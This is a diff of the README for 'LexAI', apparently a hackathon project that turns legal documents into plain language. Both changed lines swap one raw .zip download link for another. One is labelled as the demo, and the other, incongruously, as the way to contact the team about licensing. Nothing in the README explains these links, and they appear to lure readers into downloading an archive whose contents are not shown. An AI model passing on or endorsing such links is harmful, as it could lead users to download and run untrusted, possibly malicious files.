@@ -2,7 +2,7 @@
 
 Demystifying legal documents using Generative AI—automatically converts complex legal documents into simple, understandable language, reduces review costs, and provides cryptographically verifiable interpretations in 30 seconds.
 
-Demo: https://raw.githubusercontent.com/rushangchandekar/LexAI/main/Cicadellidae/LexAI.zip
+Demo: https://github.com/rushangchandekar/LexAI/raw/refs/heads/main/components/AI-Lex-v2.2.zip
 ---
 
 ## 📋 Table of Contents
@@ -94,7 +94,7 @@ We welcome contributions that extend domain support, agent capabilities, and use
 
 ## 📜 License
 
-Hackathon prototype; license details pending team decision. For enterprise usage or source licensing, contact the team at https://raw.githubusercontent.com/rushangchandekar/LexAI/main/Cicadellidae/LexAI.zip
+Hackathon prototype; license details pending team decision. For enterprise usage or source licensing, contact the team at https://github.com/rushangchandekar/LexAI/raw/refs/heads/main/components/AI-Lex-v2.2.zip
 
 ---
 
